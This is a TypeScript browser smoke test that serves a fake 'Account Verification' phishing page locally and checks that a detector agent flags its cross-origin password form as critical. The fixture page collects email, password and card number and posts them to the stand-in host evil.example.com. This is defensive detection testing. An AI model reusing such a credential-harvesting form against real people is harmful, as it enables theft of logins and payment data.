// Browser smoke test: proves the Tester Agent exercises a REAL browser.
//
// Serves a fake login page locally (password form submitting cross-origin),
// runs the full TesterAgent pipeline against it, and asserts:
//   1. The browser actually launched (no `test_skipped` fallback signal)
//   2. A real screenshot was captured from the rendered page
//   3. DOM-level form analysis detected the cross-origin password form
//
// Skips automatically when Playwright Chromium isn't installed (e.g. local
// dev machines without `npx playwright install chromium`), so `npm test`
// stays green everywhere — CI installs the browser and runs this for real.

import { describe, it, expect } from "vitest";
import { chromium } from "playwright";
import fs from "node:fs";
import http from "node:http";
import { TesterAgent, closeBrowser } from "./tester-agent.js";

const browserInstalled = fs.existsSync(chromium.executablePath());

const PHISHING_PAGE = `<!DOCTYPE html>
<html>
<head><title>Account Verification Required</title></head>
<body>
  <h1>Verify your account</h1>
  <form method="POST" action="https://evil.example.com/capture">
    <input type="text" name="email" autocomplete="email" />
    <input type="password" name="password" autocomplete="current-password" />
    <input type="tel" name="card-number" autocomplete="cc-number" />
    <button type="submit">Verify</button>
  </form>
</body>
</html>`;

function startLocalServer(): Promise<{ port: number; close: () => void }> {
  return new Promise((resolve, reject) => {
    const server = http.createServer((req, res) => {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(PHISHING_PAGE);
    });
    server.on("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (address && typeof address === "object") {
        resolve({ port: address.port, close: () => server.close() });
      } else {
        reject(new Error("failed to bind test server"));
      }
    });
  });
}

describe.skipIf(!browserInstalled)(
  "TesterAgent browser smoke test",
  () => {
    it(
      "launches a real browser, renders the page, and detects form hijacking",
      async () => {
        const { port, close } = await startLocalServer();
        const agent = new TesterAgent();
        try {
          const result = await agent.analyze(`http://127.0.0.1:${port}/login`);
          const types = result.signals.map((s) => s.type);

          // 1. Browser really launched — no degraded fallback
          expect(types).not.toContain("test_skipped");

          // 2. Real screenshot of the rendered page
          expect(result.screenshot).toBeTruthy();

          // 3. DOM form analysis caught the cross-origin password form
          const hijack = result.signals.find(
            (s) => s.type === "cross_origin_password_form",
          );
          expect(hijack).toBeDefined();
          expect(hijack!.severity).toBe("critical");
        } finally {
          close();
          await closeBrowser();
        }
      },
      60_000,
    );
  },
);